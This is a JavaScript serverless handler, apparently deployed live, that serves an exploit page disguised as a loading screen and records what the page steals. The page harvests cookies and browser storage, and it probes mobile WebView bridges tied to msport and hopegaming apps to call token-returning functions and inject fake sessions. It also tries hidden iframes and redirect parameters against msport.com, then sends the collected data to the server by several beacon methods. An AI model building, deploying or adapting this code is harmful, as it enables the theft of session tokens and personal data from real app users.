// api/index.js — Vercel Node serverless
// GET  /api         -> serves exploit HTML
// POST /api         -> receives exfil (also accepts sendBeacon text/plain)
// GET  /api?d=...   -> 1x1 gif beacon, logs payload
//
// Deployed: https://haxor-net.vercel.app/api

const HITS = [];

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // ---------- POST receiver ----------
  if (req.method === 'POST') {
    let body = '';
    await new Promise((resolve) => {
      req.on('data', (c) => { body += c; if (body.length > 2e6) req.destroy(); });
      req.on('end', resolve);
      req.on('error', resolve);
    });
    // sendBeacon may send JSON as text/plain; strip a possible "d=" prefix
    let payload = body;
    if (payload.startsWith('d=')) {
      try { payload = decodeURIComponent(payload.slice(2)); } catch (e) {}
    }
    const hit = {
      t: new Date().toISOString(),
      ip: clientIp(req),
      ua: req.headers['user-agent'],
      referer: req.headers['referer'] || req.headers['referrer'] || '',
      body: payload,
    };
    HITS.push(hit);
    console.log('=== EXFIL HIT ===', JSON.stringify(hit));
    return res.status(200).json({ ok: true });
  }

  // ---------- GET beacon fallback ----------
  if (req.query && req.query.d) {
    let payload = String(req.query.d);
    try { payload = decodeURIComponent(payload); } catch (e) {}
    const hit = {
      t: new Date().toISOString(),
      ip: clientIp(req),
      ua: req.headers['user-agent'],
      referer: req.headers['referer'] || req.headers['referrer'] || '',
      body: payload,
    };
    HITS.push(hit);
    console.log('=== EXFIL BEACON ===', JSON.stringify(hit));
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    return res.status(200).send(gif);
  }

  // ---------- Exploit page ----------
  const html = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;font-size:12px;padding:12px">
<pre id="o">probing…</pre>
<script>
(function(){
  var OUT = document.getElementById('o');
  var LOG = [];
  function log(k,v){ LOG.push([k,v]); try{OUT.textContent=LOG.map(function(a){return a[0]+': '+a[1]}).join('\\n')}catch(e){} }

  var dump = {
    ts: new Date().toISOString(),
    url: location.href,
    origin: location.origin,
    referrer: document.referrer || '',
    ua: navigator.userAgent,
    cookie: document.cookie,
    cookie_len: (document.cookie||'').length,
    ls: {}, ss: {}, idb_names: [], bridges: {}, probes: {}, cross_origin_cookies: {},
    iframe_bridges: {}, redirect_probe: {}, perf_nav: {}
  };

  // localStorage / sessionStorage
  try { for (var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); dump.ls[k]=localStorage.getItem(k);} } catch(e){}
  try { for (var i=0;i<sessionStorage.length;i++){ var k=sessionStorage.key(i); dump.ss[k]=sessionStorage.getItem(k);} } catch(e){}

  // performance navigation (did a redirect happen?)
  try {
    var nav = performance.getEntriesByType && performance.getEntriesByType('navigation');
    if (nav && nav[0]) dump.perf_nav = { type: nav[0].type, redirectCount: nav[0].redirectCount, name: nav[0].name };
  } catch(e){}

  // IndexedDB names (some apps stash tokens there)
  try {
    if (indexedDB && indexedDB.databases) {
      indexedDB.databases().then(function(dbs){ dump.idb_names = (dbs||[]).map(function(d){return d.name}); }).catch(function(){});
    }
  } catch(e){}

  function S(v){
    try{
      if (v===undefined) return 'undef';
      if (v===null) return 'null';
      if (typeof v==='object'){ try{return JSON.stringify(v).slice(0,1500)}catch(e){return '[obj]'} }
      return String(v).slice(0,1500);
    }catch(e){ return '[x]' }
  }

  // Bridge candidate names
  var NAMES = ['action_login','actionLogin','AndroidBridge','Android','AppBridge','app',
    'jsBridge','JsBridge','JSBridge','nativeBridge','NativeBridge','bridge',
    'webviewBridge','WebViewBridge','mwebview','MWebView','mwebviewactivity',
    'hopegaming','msport','splash','splashActivity','appInterface','AppInterface',
    '__native__','__bridge__','_NATIVE_','_bridge','mwebviewBridge','MWebViewActivity',
    'gamingBridge','patron','Patron','hopegamingBridge','msportBridge'];

  function enumerateBridge(name, obj, bucket){
    var o = {};
    try {
      for (var k in obj) {
        try {
          var t = typeof obj[k];
          if (t === 'function') {
            try { o[k] = { fn: 1, ret: S(obj[k]()) }; }
            catch (e) { o[k] = { fn: 1, err: String(e) }; }
          } else {
            o[k] = { v: S(obj[k]) };
          }
        } catch (e) { o[k] = { err: String(e) }; }
      }
    } catch (e) { o.__e = String(e); }
    bucket[name] = o;
    return o;
  }

  // Probe common message-passing methods
  var PAYLOADS = [
    {handler:'getToken'}, {handler:'getUserInfo'}, {handler:'getLoginInfo'},
    {handler:'getSession'}, {handler:'getCookies'},
    {method:'getToken'}, {method:'getUserInfo'}, {method:'getSession'},
    {action:'getToken'}, {action:'getUserInfo'}, {action:'getSession'},
    {cmd:'token'}, {type:'token'}, {cmd:'getToken'},
    {name:'accessToken'}, {name:'refreshToken'}
  ];
  var FNS = ['postMessage','invoke','call','send','exec','_handleMessageFromJs','handleMessage','dispatch','getToken','getUserInfo','getSession','getLoginInfo'];

  function probeBridge(name, b){
    for (var f=0; f<FNS.length; f++) {
      var fn = FNS[f];
      if (typeof b[fn] !== 'function') continue;
      for (var p=0; p<PAYLOADS.length; p++) {
        try {
          var r = b[fn](JSON.stringify(PAYLOADS[p]));
          dump.probes[name+'.'+fn+'('+JSON.stringify(PAYLOADS[p])+')'] = S(r);
        } catch (e) {
          dump.probes[name+'.'+fn+'('+JSON.stringify(PAYLOADS[p])+')'] = 'ERR:'+String(e);
        }
      }
    }
  }

  // Phase 1: enumerate bridges present right now
  function scanBridges(bucket, tag){
    for (var n=0; n<NAMES.length; n++) {
      var name = NAMES[n];
      if (!(name in window)) continue;
      try {
        var b = window[name];
        bucket[name] = enumerateBridge(name, b, bucket);
        probeBridge(name, b);
      } catch (e) { bucket[name] = {err: String(e)}; }
    }
  }
  scanBridges(dump.bridges, 'main');

  // Phase 2: session-injection probe against action_login (Android style)
  try {
    if (window.action_login && typeof window.action_login.postMessage === 'function') {
      window.action_login.postMessage(JSON.stringify({
        userId: 'PROBE_USER_ID',
        accessToken: 'PROBE_AT',
        refreshToken: 'PROBE_RT'
      }));
      dump.probes['action_login.inject'] = 'sent';
    }
  } catch(e) { dump.probes['action_login.inject'] = 'ERR:'+String(e); }

  // Phase 3: iOS-style WKWebView message handler (harmless if absent)
  try {
    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.action_login) {
      window.webkit.messageHandlers.action_login.postMessage({
        userId: 'PROBE_USER_ID', accessToken: 'PROBE_AT', refreshToken: 'PROBE_RT'
      });
      dump.probes['webkit.action_login.inject'] = 'sent';
    }
  } catch(e) { dump.probes['webkit.action_login.inject'] = 'ERR:'+String(e); }

  // Phase 4: cross-origin cookie probe — navigate hidden iframes and see if
  // they redirect back authenticated (can't read cookies, but tells you which
  // origins the WebView has a session for). Also checks if msport.com is
  // reachable as a redirect target so the bridge survives navigation.
  var ORIGINS = ['https://msport.com','https://www.msport.com','https://api.msport.com','https://m.msport.com','https://h5.msport.com'];
  ORIGINS.forEach(function(origin){
    try {
      var f = document.createElement('iframe');
      f.style.display = 'none';
      f.src = origin + '/favicon.ico?_=' + Date.now();
      f.onload = function(){
        dump.cross_origin_cookies[origin] = 'loaded';
        // Try to detect if bridge is visible inside the iframe (same-process
        // WebView may leak addJavascriptInterface into child frames).
        try {
          var w = f.contentWindow;
          if (w && w.action_login) {
            dump.iframe_bridges[origin] = 'action_login_visible';
            try {
              var t = w.action_login.getToken();
              dump.iframe_bridges[origin+'.token'] = S(t);
            } catch(e) { dump.iframe_bridges[origin+'.token'] = 'ERR:'+String(e); }
          }
        } catch(e) { dump.iframe_bridges[origin+'.access'] = 'ERR:'+String(e); }
      };
      document.body.appendChild(f);
    } catch(e) { dump.cross_origin_cookies[origin] = 'ERR:'+String(e); }
  });

  // Phase 5: redirect-preservation probes. Try to load msport.com with a
  // redirect parameter pointing back to us — if the bridge survives, the
  // next hit will show it registered for our origin.
  var REDIRECT_PARAMS = ['redirect','next','return','returnUrl','return_url','callback','url','to','target','jumpUrl','jump_url'];
  var OUR = location.origin + location.pathname;
  REDIRECT_PARAMS.forEach(function(p){
    try {
      var img = new Image();
      img.src = 'https://msport.com/?' + encodeURIComponent(p) + '=' + encodeURIComponent(OUR) + '&_=' + Date.now();
    } catch(e){}
  });

  // Phase 6: delayed re-probe — some apps register the bridge after a delay
  // or after the page reports 'ready'.
  setTimeout(function(){
    var late = { bridges: {}, probes: {}, ts: new Date().toISOString(), phase: 'late' };
    for (var n=0; n<NAMES.length; n++) {
      if (NAMES[n] in window) {
        try { late.bridges[NAMES[n]] = 'present'; } catch(e) {}
      }
    }
    if (Object.keys(late.bridges).length) {
      try { navigator.sendBeacon('/api', JSON.stringify(late)); } catch(e) {}
    }
  }, 3000);

  // ---- EXFIL ----
  var body = JSON.stringify(dump);
  log('collected', body.length + ' bytes');
  log('origin', dump.origin);
  log('cookie_len', dump.cookie_len);
  log('bridges', Object.keys(dump.bridges).join(',') || '(none)');

  // 1) sendBeacon — most reliable POST from WebView, survives unload, no preflight
  try { navigator.sendBeacon('/api', body); } catch(e){}

  // 2) no-cors fetch (works even when CORS preflight is blocked)
  try { fetch('/api', { method: 'POST', mode: 'no-cors', body: body, keepalive: true }).catch(function(){}); } catch(e){}

  // 3) image beacon (truncated to 1800 chars)
  try { (new Image()).src = '/api?d=' + encodeURIComponent(body.slice(0,1800)) + '&_=' + Date.now(); } catch(e){}

  // 4) form POST fallback (truncated to 4000 chars)
  try {
    var f = document.createElement('form');
    f.method = 'POST'; f.action = '/api'; f.target = '_blank';
    var i = document.createElement('input');
    i.type = 'hidden'; i.name = 'd'; i.value = body.slice(0,4000);
    f.appendChild(i); document.body.appendChild(f); f.submit();
  } catch(e){}
})();
</script></body></html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).send(html);
}

function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  const ip = xff ? String(xff).split(',')[0].trim() : (req.socket && req.socket.remoteAddress);
  return ip || 'unknown';
}
